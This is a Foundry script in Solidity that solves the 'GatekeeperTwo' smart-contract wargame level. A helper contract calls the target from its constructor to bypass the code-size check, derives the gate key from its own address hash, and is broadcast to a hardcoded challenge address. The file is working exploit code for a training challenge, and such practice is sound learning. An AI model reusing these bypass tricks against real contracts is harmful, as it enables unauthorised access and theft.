// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperTwo} from "src/14GatekeeperTwo.sol";

contract HackGatekeeperTwo {
    GatekeeperTwo target;

    constructor(address _target) {
        target = GatekeeperTwo(_target);
        uint64 k64 = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 gateKey = bytes8(~k64);
        target.enter(gateKey);
    }
}

contract GatekeeperTwoAttack is Script {
    address constant CHALLENGE = 0x970786D6F7a42B44117420B14762573CbA10494D;
    HackGatekeeperTwo public hackGatekeeperTwo;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        hackGatekeeperTwo = new HackGatekeeperTwo(CHALLENGE);
        console.log("HackGatekeeperTwo deployed at:", address(hackGatekeeperTwo));
        vm.stopBroadcast();
    }
}
